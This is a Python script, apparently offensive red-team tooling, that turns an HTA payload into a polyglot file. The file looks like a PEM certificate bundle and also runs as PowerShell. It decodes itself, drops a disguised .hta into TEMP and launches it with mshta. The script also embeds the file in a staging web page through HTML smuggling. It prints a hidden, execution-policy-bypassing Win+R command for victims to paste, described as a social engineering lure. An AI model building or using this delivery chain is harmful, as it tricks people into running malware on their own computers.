"""
encode-command.py
Produces a polyglot cert_bundle.txt that is simultaneously:
  - A PEM-formatted certificate bundle (social engineering lure)
  - A self-contained PowerShell script that decodes and executes itself

Also performs HTML Smuggling (T1027.006): embeds cert_bundle.txt as a
base64 Blob inside staging.html so no separate server request is needed.

Usage:
    python encode-command.py

Outputs:
    cert_bundle.txt   - polyglot PEM/PS file (for direct testing)
    staging.html      - updated in-place with smuggled payload
"""

import base64
import os
import re
import textwrap

HTA_INPUT       = 'stage1.hta'
PEM_OUTPUT      = 'cert_bundle.txt'
STAGING_HTML    = 'staging.html'
HTA_DROP_NAME   = 'hpsolutionsportal.hta'

PEM_HEADER = '-----BEGIN CERTIFICATE-----'
PEM_FOOTER = '-----END CERTIFICATE-----'


def build_ps_embed(drop_name: str) -> str:
    """
    PS script body embedded inside the polyglot PEM.
    Uses $PSCommandPath to read its own base64 content and decode it.
    T1140 - Deobfuscate/Decode: FromBase64Transform
    T1036.005 - filename exclusion bypass via drop_name
    """
    bin_name = os.path.splitext(drop_name)[0] + '.bin'
    return (
        '$f=Join-Path $env:USERPROFILE Downloads\\cert_bundle.txt;'
        '$s=((Get-Content $f'
        '|Where-Object{$_ -match \'^[A-Za-z0-9+/=]+$\'}'
        '|Out-String) -replace \'[\\r\\n]\',\'\');'
        '$bt=[Text.Encoding]::ASCII.GetBytes($s);'
        '$x=New-Object Security.Cryptography.FromBase64Transform;'
        '$m=New-Object IO.MemoryStream;'
        '$c=New-Object Security.Cryptography.CryptoStream'
        '($m,$x,[Security.Cryptography.CryptoStreamMode]::Write);'
        '$c.Write($bt,0,$bt.Length);$c.FlushFinalBlock();'
        f'$tb=Join-Path $env:TEMP {bin_name};'
        '[IO.File]::WriteAllBytes($tb,$m.ToArray());'
        f'$th=Join-Path $env:TEMP {drop_name};'
        'if(Test-Path $th){Remove-Item $th -Force};'
        'Rename-Item $tb $th;'
        'mshta.exe $th'
    )


def encode_pem(hta_path: str, pem_path: str, drop_name: str) -> tuple:
    with open(hta_path, 'rb') as f:
        raw = f.read()

    b64 = base64.b64encode(raw).decode('ascii')
    wrapped = textwrap.wrap(b64, 64)

    # Polyglot: PS block comment wraps the PEM header/footer so PS ignores them.
    # The PS script body below reads $PSCommandPath and extracts base64 lines.
    content = (
        '<#\n'
        + PEM_HEADER + '\n'
        + '\n'.join(wrapped) + '\n'
        + PEM_FOOTER + '\n'
        + '#>\n'
        + build_ps_embed(drop_name) + '\n'
    )

    with open(pem_path, 'w', newline='\n') as f:
        f.write(content)

    return len(raw), len(content), content


def inject_smuggled_payload(staging_path: str, pem_content: str) -> None:
    """
    T1027.006 - HTML Smuggling: embed cert_bundle.txt as base64 Blob in staging.html.
    Replaces the var b64 = '...' injection point in triggerDownload().
    staging.html no longer needs to fetch cert_bundle.txt from the server.
    """
    payload_b64 = base64.b64encode(pem_content.encode('utf-8')).decode('ascii')
    with open(staging_path, 'r', encoding='utf-8') as f:
        html = f.read()
    updated = re.sub(
        r"var b64 = '[A-Za-z0-9+/=]*'",
        f"var b64 = '{payload_b64}'",
        html
    )
    if updated == html:
        print(f'[!] b64 injection point not found in {staging_path}')
        return
    with open(staging_path, 'w', encoding='utf-8', newline='\n') as f:
        f.write(updated)
    print(f'[+] Smuggled payload -> staging.html ({len(payload_b64):,} b64 chars)')


def build_ps_command(drop_name):
    """
    Short Win+R command: iex(gc -Raw) reads the polyglot PEM and executes it.
    Avoids the -File .ps1 extension restriction.
    %USERPROFILE% is expanded by Win+R/cmd before PS receives the argument.
    """
    del drop_name  # unused; drop logic lives inside the polyglot PEM
    return "powershell -w h -ep bypass -c \"iex(gc -Raw '%USERPROFILE%\\Downloads\\cert_bundle.txt')\""


def main():
    script_dir = os.path.dirname(os.path.abspath(__file__))
    hta_path   = os.path.join(script_dir, HTA_INPUT)
    pem_path   = os.path.join(script_dir, PEM_OUTPUT)

    if not os.path.exists(hta_path):
        print(f'[!] Input not found: {hta_path}')
        return

    orig_size, pem_size, pem_content = encode_pem(hta_path, pem_path, HTA_DROP_NAME)
    print(f'[+] {HTA_INPUT} -> {PEM_OUTPUT}')
    print(f'    Original : {orig_size:,} bytes')
    print(f'    PEM      : {pem_size:,} bytes')
    print()

    staging_path = os.path.join(script_dir, STAGING_HTML)
    if os.path.exists(staging_path):
        inject_smuggled_payload(staging_path, pem_content)
    else:
        print(f'[!] {STAGING_HTML} not found, skipping smuggling injection')
    print()

    ps_cmd = build_ps_command(HTA_DROP_NAME)
    print('--- paste into Win+R ---')
    print(ps_cmd)


if __name__ == '__main__':
    main()
